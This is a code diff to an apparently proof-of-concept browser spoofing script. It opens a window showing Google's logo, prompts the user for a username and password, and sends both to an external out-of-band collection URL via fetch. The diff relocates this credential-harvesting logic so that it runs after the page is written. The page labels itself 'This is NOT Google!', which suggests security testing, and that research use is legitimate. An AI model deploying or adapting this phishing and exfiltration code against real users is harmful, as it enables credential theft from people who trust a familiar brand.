@@ -9,21 +9,19 @@ function spoof() {
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">
         <h1>This is NOT Google!</h1>
         <p>Please enter your credentials:</p>
-        <script>
-            setTimeout(() => {
-                let u = prompt('Enter your username:');
-                let p = prompt('Enter your password:');
-                // Simulate exfiltration (in a real attack, this would send data to an attacker server)
-                let exfilUrl = 'https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/collect?username=' + encodeURIComponent(u) + '&password=' + encodeURIComponent(p);
-                fetch(exfilUrl).catch(e => console.log("Exfiltration blocked:", e));
-                alert('Your creds:\\nUsername: ' + u + '\\nPassword: ' + p);
-            }, 500);
-        </script>
     </div>`;
     setTimeout(() => {
         try {
             win.document.write(payload);
             win.document.close();
+            // Execute the prompt logic in the new window
+            setTimeout(() => {
+                let u = prompt('Enter your username:');
+                let p = prompt('Enter your password:');
+                let exfilUrl = 'https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/collect?username=' + encodeURIComponent(u) + '&password=' + encodeURIComponent(p);
+                fetch(exfilUrl).catch(e => console.log("Exfiltration blocked:", e));
+                alert('Your creds:\\nUsername: ' + u + '\\nPassword: ' + p);
+            }, 500);
         } catch (e) {
             console.warn("Blocked by browser protections:", e);
         }
